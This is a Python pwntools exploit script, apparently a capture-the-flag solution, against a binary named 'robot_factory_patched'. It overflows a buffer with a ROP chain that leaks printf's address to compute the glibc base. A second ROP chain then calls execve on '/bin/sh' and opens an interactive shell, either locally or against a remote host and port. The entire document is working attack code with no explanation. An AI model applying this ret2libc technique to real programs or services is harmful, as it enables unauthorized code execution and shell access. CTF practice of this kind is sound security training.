#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('robot_factory_patched')
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create_robot(p, kind: bytes, operation: bytes, a: bytes, b: bytes):
    p.recv(timeout=0.1)
    p.sendline(kind)
    p.sendlineafter(b'(a/s/m) > ', operation)
    p.sendlineafter(b': ', a)
    p.sendlineafter(b': ', b)


def main():
    p = get_process()
    rop = ROP(elf)

    rop_chain  = p64(rop.rdi.address)
    rop_chain += p64(elf.got.printf)
    rop_chain += p64(elf.plt.puts)
    rop_chain += p64(elf.plt.sleep)

    payload  = b'A' * 32
    payload += rop_chain
    payload += b'A' * (248 - len(payload))

    create_robot(p, b's', b'm', payload, b'9')

    printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))
    glibc.address = printf_addr - glibc.sym.printf

    p.success(f'Glibc base address: {hex(glibc.address)}')

    rop = ROP([elf, glibc])

    rop_chain  = p64(rop.rdi.address)
    rop_chain += p64(next(glibc.search(b'/bin/sh')))
    rop_chain += p64(rop.rsi.address)
    rop_chain += p64(0)
    rop_chain += p64(rop.find_gadget(['pop rdx', 'pop r12', 'ret']).address)
    rop_chain += p64(0)
    rop_chain += b'A' * 8
    rop_chain += p64(glibc.sym.execve)

    payload  = b'A' * 32
    payload += rop_chain
    payload += b'A' * (248 - len(payload))

    create_robot(p, b's', b'm', payload, b'9')

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
